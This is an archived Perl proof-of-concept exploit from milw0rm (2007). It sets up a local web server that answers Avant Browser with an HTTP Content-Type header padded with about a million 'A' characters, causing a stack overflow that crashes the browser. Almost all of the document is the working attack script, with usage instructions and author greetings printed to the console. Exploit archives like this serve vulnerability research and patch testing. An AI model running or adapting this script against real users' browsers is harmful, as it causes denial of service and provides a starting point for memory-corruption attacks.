#!/usr/bin/perl
# Avant Browser (ALL Version) Remot Stack OverFlow (Crash)
# Discovered by DATA_SNIPER
# Usage:
# connect from Avant browser to http://127.0.0.1/
use IO::Socket;
my $sock=new IO::Socket::INET (
Listen    => 1,
                                
LocalAddr => 'localhost',
                                
LocalPort => 80,
                               
Proto     => 'tcp');
die unless $sock;
$huge="A" x 1034985;
$|=1;
print "==========================================================================\n";
print "        Avant Browser (ALL Version) Remot Stack OverFlow (Crash)
";
print "                 Vulnerability Discovered by DATA_SNIPER
";
print "   GreetZ To:Hacking Master,Dear Devil,Xodia,JASS,All Algerian Hackers \n";
print "               Mail me at:Alpha_3(at)hotmail(dot)com\n";
print "==========================================================================\n";
print"[+] Http server started on port  80... \n";
print"[+] Try To Explorer http://127.0.0.1/ \n";
$z=$sock->accept();
print"[+] Connection Accepted!\n";
do
{
 $ln=<$z>;
 
print $ln;
 chomp $ln;
 
 if (($ln eq "")||($ln eq "\n")||($ln eq "\r"))
 {
  
print"[>]Sending Evil Packet\n";
  
print $z " HTTP/1.1 200 OK\r\nServer: bugs 3.1.02\r\nContent-Type:$huge\r\nConnection: close\r\n\r\n";
close($z);
  
exit;
 
}
} while (true);

# milw0rm.com [2007-03-18]